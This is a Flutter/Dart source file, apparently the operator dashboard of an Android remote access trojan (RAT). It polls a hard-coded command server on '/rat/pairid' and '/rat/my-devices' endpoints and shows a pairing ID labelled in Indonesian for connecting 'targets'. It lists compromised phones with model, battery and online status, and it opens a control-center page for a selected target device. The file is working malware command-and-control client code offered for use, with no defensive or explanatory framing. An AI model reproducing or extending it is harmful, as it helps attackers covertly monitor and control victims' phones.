import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'dart:ui';
import 'package:shared_preferences/shared_preferences.dart';
import 'control_panel.dart';

// ─── GLOBAL FONT ───────────────────────────────────────────────────────
const String kFont = 'Pek';

// ─── PALETTE DARI _C ──────────────────────────────────────────────────────────
class _C {
  static const bg = Color(0xFF0A0A0F);
  static const surface = Color(0xFF12121A);
  static const card = Color(0x0DFFFFFF);
  static const border = Color(0x1AFFFFFF);
  static const primary = Color(0xFFFF1744);
  static const primaryDark = Color(0xFFB71C1C);
  static const accent = Color(0xFFFF8A80);
  static const success = Color(0xFF00E676);
  static const secondary = Color(0xFFFF5252);
  static const text = Color(0xFFF5EEEE);
  static const textSub = Color(0xFFE0AAAA);
  static const textDim = Color(0xFF994444);
  static const white = Color(0xFFF5EEEE);
  static const whiteDim = Color(0xFFCCAAAA);
  static const black = Color(0xFF0A0A0F);
  static const glassBorder = Color(0x1AFFFFFF);

  static LinearGradient get btnGrad => const LinearGradient(
    colors: [Color(0xFFFF1744), Color(0xFFB71C1C)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );

  static LinearGradient get glassGrad => LinearGradient(
    colors: [Color(0x0DFFFFFF), Color(0x03FFFFFF)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );

  static List<BoxShadow> get glassShadow => [
    BoxShadow(color: Color(0x66000000), blurRadius: 30, offset: const Offset(0, 8)),
    BoxShadow(color: Color(0x0DFF1744), blurRadius: 60, offset: const Offset(0, -4)),
  ];

  static List<BoxShadow> get glowShadow => [
    BoxShadow(color: Color(0x4DFF1744), blurRadius: 20, spreadRadius: 2),
  ];

  static List<BoxShadow> get softShadow => [
    BoxShadow(color: Color(0x1F000000), blurRadius: 16, offset: const Offset(0, 4)),
  ];
}

const _kBase = 'http://digital.mypanelku.web.id:2041';

class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;
  const DeviceDashboardPage({
    super.key,
    this.username = '',
    this.role = '',
    this.sessionKey = ''
  });

  @override
  State<DeviceDashboardPage> createState() => _DDState();
}

class _DDState extends State<DeviceDashboardPage> with TickerProviderStateMixin {
  // ─── PALETTE ────────────────────────────────────────────────────────────────
  final Color _bg = _C.bg;
  final Color _card = _C.card;
  final Color _card2 = _C.surface;
  final Color _border = _C.border;
  final Color _accent = _C.primary;
  final Color _gold = _C.secondary;
  final Color _textP = _C.text;
  final Color _textS = _C.textSub;
  final Color _textM = _C.textDim;
  final Color _green = _C.success;
  final Color _red = _C.primary;

  List<dynamic> _devices = [];
  bool _loading = true;
  Timer? _timer;
  Map<String, dynamic>? _selectedDevice;
  String _pairId = '';

  @override
  void initState() {
    super.initState();
    _loadAll();
    _loadPairId();
    _timer = Timer.periodic(const Duration(seconds: 20), (_) => _loadAll());
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  Future<void> _loadPairId() async {
    try {
      final res = await http.get(
        Uri.parse('$_kBase/rat/pairid?key=${widget.sessionKey}')
      );
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['valid'] == true && data['pairId'] != null) {
          setState(() => _pairId = data['pairId'].toString());
        }
      }
    } catch (e) {}
  }

  Future<void> _loadAll() async {
    if (!mounted) return;
    setState(() => _loading = true);

    try {
      final dRes = await http
          .get(Uri.parse('$_kBase/rat/my-devices?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 10));

      if (!mounted) return;
      if (dRes.statusCode != 200) {
        setState(() { _loading = false; });
        return;
      }

      final body = jsonDecode(dRes.body);
      if (body['valid'] != true) {
        setState(() { _loading = false; });
        return;
      }

      List<dynamic> devices = List<dynamic>.from(body['devices'] ?? []);
      final now = DateTime.now();
      for (var d in devices) {
        try {
          final seen = DateTime.parse(d['lastSeen']?.toString() ?? '');
          d['online'] = now.difference(seen).inSeconds < 30;
        } catch (_) { d['online'] = false; }
      }

      if (mounted) setState(() {
        _devices = devices;
        _loading = false;
      });
    } catch (e) {
      if (mounted) setState(() { _loading = false; });
    }
  }

  // ─── PAIRING ID CARD ──────────────────────────────────────────────────────
  Widget _buildPairIdCard() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 8, 16, 12),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(16),
        child: BackdropFilter(
          filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
          child: Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              gradient: _C.glassGrad,
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: _border, width: 1),
              boxShadow: _C.glassShadow,
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: _accent.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(10),
                        border: Border.all(color: _accent.withOpacity(0.2)),
                      ),
                      child: Icon(
                        Icons.link_rounded,
                        color: _accent,
                        size: 20,
                      ),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            "ID PAIRING",
                            style: TextStyle(
                              color: _textP,
                              fontSize: 13,
                              fontWeight: FontWeight.bold,
                              letterSpacing: 1,
                              fontFamily: kFont,
                            ),
                          ),
                          Text(
                            "Gunakan ID ini untuk koneksi target",
                            style: TextStyle(
                              color: _textM,
                              fontSize: 10,
                              fontFamily: kFont,
                            ),
                          ),
                        ],
                      ),
                    ),
                    // ─── TOMBOL COPY ──────────────────────────────────────────
                    GestureDetector(
                      onTap: () {
                        if (_pairId.isNotEmpty) {
                          Clipboard.setData(ClipboardData(text: _pairId));
                          ScaffoldMessenger.of(context).showSnackBar(
                            SnackBar(
                              content: Text(
                                'ID Pairing disalin!',
                                style: TextStyle(
                                  fontFamily: kFont,
                                  color: _textP,
                                ),
                              ),
                              backgroundColor: _C.card,
                              shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(8),
                              ),
                              behavior: SnackBarBehavior.floating,
                              duration: const Duration(seconds: 2),
                            ),
                          );
                        }
                      },
                      child: Container(
                        padding: const EdgeInsets.all(10),
                        decoration: BoxDecoration(
                          color: _accent.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(10),
                          border: Border.all(
                            color: _accent.withOpacity(0.2),
                            width: 1,
                          ),
                        ),
                        child: Icon(
                          Icons.copy_rounded,
                          color: _accent,
                          size: 18,
                        ),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 10),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                  decoration: BoxDecoration(
                    color: _accent.withOpacity(0.05),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(
                      color: _accent.withOpacity(0.15),
                      width: 1,
                    ),
                  ),
                  width: double.infinity,
                  child: Text(
                    _pairId.isEmpty ? 'Loading...' : _pairId,
                    style: TextStyle(
                      color: _accent,
                      fontSize: 18,
                      fontWeight: FontWeight.bold,
                      fontFamily: kFont,
                      letterSpacing: 1.5,
                    ),
                    textAlign: TextAlign.center,
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  // ─── DEVICE LIST ──────────────────────────────────────────────────────────
  Widget _buildDeviceList() {
    if (_loading) {
      return const Center(
        child: CircularProgressIndicator(color: _C.primary),
      );
    }

    if (_devices.isEmpty) {
      return Center(
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(Icons.devices_other_rounded, color: _textM, size: 52),
            const SizedBox(height: 14),
            Text(
              "NO DEVICES",
              style: TextStyle(
                color: _textS,
                fontWeight: FontWeight.bold,
                letterSpacing: 2,
                fontSize: 13,
                fontFamily: kFont,
              ),
            ),
            const SizedBox(height: 6),
            Text(
              "Belum ada device terhubung",
              style: TextStyle(
                color: _textM,
                fontSize: 11,
                fontFamily: kFont,
              ),
            ),
          ],
        ),
      );
    }

    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 16),
      child: ListView.separated(
        shrinkWrap: true,
        physics: const NeverScrollableScrollPhysics(),
        itemCount: _devices.length,
        separatorBuilder: (_, __) => const SizedBox(height: 10),
        itemBuilder: (ctx, i) {
          final d = _devices[i];
          final on = d['online'] == true;
          final deviceName = d['model'] ?? 'Unknown Device';
          final deviceId = d['id'] ?? '-';
          final battery = d['battery'] ?? '?';

          return GestureDetector(
            onTap: () {
              setState(() {
                _selectedDevice = d;
              });
              Navigator.push(
                context,
                MaterialPageRoute(
                  builder: (_) => ControlCenterPage(
                    targetDevice: d,
                    role: widget.role,
                    username: widget.username,
                    sessionKey: widget.sessionKey,
                    news: const [],
                  ),
                ),
              );
            },
            child: ClipRRect(
              borderRadius: BorderRadius.circular(16),
              child: BackdropFilter(
                filter: ImageFilter.blur(sigmaX: 8, sigmaY: 8),
                child: Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    gradient: _C.glassGrad,
                    borderRadius: BorderRadius.circular(16),
                    border: Border.all(
                      color: on ? _accent.withOpacity(0.4) : _border.withOpacity(0.3),
                      width: 1.5,
                    ),
                    boxShadow: _C.softShadow,
                  ),
                  child: Row(
                    children: [
                      Container(
                        width: 50,
                        height: 50,
                        decoration: BoxDecoration(
                          color: _accent.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(color: _accent.withOpacity(0.2)),
                        ),
                        child: Icon(Icons.phone_android_rounded, color: _accent, size: 24),
                      ),
                      const SizedBox(width: 14),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              deviceName,
                              style: TextStyle(
                                color: _textP,
                                fontSize: 15,
                                fontWeight: FontWeight.bold,
                                fontFamily: kFont,
                              ),
                              maxLines: 2,
                              overflow: TextOverflow.ellipsis,
                            ),
                            const SizedBox(height: 4),
                            Row(
                              children: [
                                Text(
                                  deviceId,
                                  style: TextStyle(
                                    color: _textM,
                                    fontSize: 11,
                                    fontFamily: kFont,
                                  ),
                                  maxLines: 1,
                                  overflow: TextOverflow.ellipsis,
                                ),
                                const SizedBox(width: 10),
                                Container(
                                  width: 6,
                                  height: 6,
                                  decoration: BoxDecoration(
                                    shape: BoxShape.circle,
                                    color: on ? _green : _red,
                                    boxShadow: [
                                      BoxShadow(
                                        color: on ? _green.withOpacity(0.5) : _red.withOpacity(0.5),
                                        blurRadius: 6,
                                      ),
                                    ],
                                  ),
                                ),
                                const SizedBox(width: 4),
                                Text(
                                  on ? 'ONLINE' : 'OFFLINE',
                                  style: TextStyle(
                                    color: on ? _green : _red,
                                    fontSize: 9,
                                    fontWeight: FontWeight.bold,
                                    fontFamily: kFont,
                                  ),
                                ),
                              ],
                            ),
                            const SizedBox(height: 4),
                            Row(
                              children: [
                                Icon(
                                  Icons.battery_charging_full_rounded,
                                  color: _accent,
                                  size: 14,
                                ),
                                const SizedBox(width: 4),
                                Text(
                                  '$battery%',
                                  style: TextStyle(
                                    color: _textP,
                                    fontSize: 12,
                                    fontWeight: FontWeight.w500,
                                    fontFamily: kFont,
                                  ),
                                ),
                              ],
                            ),
                          ],
                        ),
                      ),
                      Icon(
                        Icons.chevron_right_rounded,
                        color: _accent.withOpacity(0.5),
                        size: 24,
                      ),
                    ],
                  ),
                ),
              ),
            ),
          );
        },
      ),
    );
  }

  // ─── BODY ──────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bg,
      body: Stack(
        children: [
          // ✅ BACKGROUND FOTO mmk.jpg
          Positioned.fill(
            child: Image.asset(
              'assets/images/mmk.jpg',
              fit: BoxFit.cover,
              errorBuilder: (_, __, ___) => Container(color: _bg),
            ),
          ),

          // ✅ Overlay gelap
          Positioned.fill(
            child: Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [
                    _bg.withOpacity(0.75),
                    _bg.withOpacity(0.88),
                    _bg.withOpacity(0.95),
                  ],
                ),
              ),
            ),
          ),

          SafeArea(
            child: SingleChildScrollView(
              physics: const BouncingScrollPhysics(),
              child: Column(
                children: [
                  // ─── PAIRING ID DI ATAS ──────────────────────────────────────
                  _buildPairIdCard(),

                  // ─── LIST DEVICE DI BAWAH ──────────────────────────────────
                  _buildDeviceList(),

                  const SizedBox(height: 30),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}